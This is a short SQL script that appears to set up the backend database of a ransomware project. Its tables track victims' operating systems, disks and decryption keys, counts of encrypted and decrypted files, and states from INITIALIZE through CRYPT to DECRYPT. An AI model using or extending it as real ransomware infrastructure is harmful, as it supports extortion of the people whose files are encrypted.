drop table if exists decrypted;
drop table if exists encrypted;
drop table if exists states;
drop table if exists victims;
drop table if exists States_Link;

CREATE TABLE victims(
    id_victim INTEGER PRIMARY KEY ,
    os VARCHAR ,
    hash VARCHAR ,
    disks VARCHAR ,
    key VARCHAR
);

CREATE TABLE decrypted(
    id_decrypted INTEGER PRIMARY KEY ,
    id_victim INTEGER ,
    datetime timestamp ,
    nb_files INTEGER ,
    FOREIGN KEY(id_victim) REFERENCES victims(id_victim),
    FOREIGN KEY(id_decrypted) REFERENCES states(id_states)
);

CREATE TABLE states(
    id_states INTEGER,
    id_victim INTEGER,
    datetime timestamp,
    state VARCHAR,
    FOREIGN KEY(id_victim) REFERENCES victims(id_victim),
    FOREIGN KEY(id_states) REFERENCES States_Link(id_states)
);

CREATE TABLE encrypted(
    id_encrypted INTEGER PRIMARY KEY ,
    id_victim INTEGER ,
    datetime timestamp ,
    nb_files INTEGER ,
    FOREIGN KEY(id_victim) REFERENCES victims(id_victim),
    FOREIGN KEY(id_encrypted) REFERENCES states(id_states)
);

CREATE TABLE States_Link(
    id_states INTEGER ,
    states VARCHAR ,
    FOREIGN KEY(id_states) REFERENCES states(id_states),
    FOREIGN KEY(states) REFERENCES states(state)
);



INSERT INTO States_Link (id_states, states) VALUES (1, 'INITIALIZE');
INSERT INTO States_Link (id_states, states) VALUES (2, 'CRYPT');
INSERT INTO States_Link (id_states, states) VALUES (3, 'PENDING');
INSERT INTO States_Link (id_states, states) VALUES (4, 'DECRYPT');
INSERT INTO States_Link (id_states, states) VALUES (5, 'PROTECTED');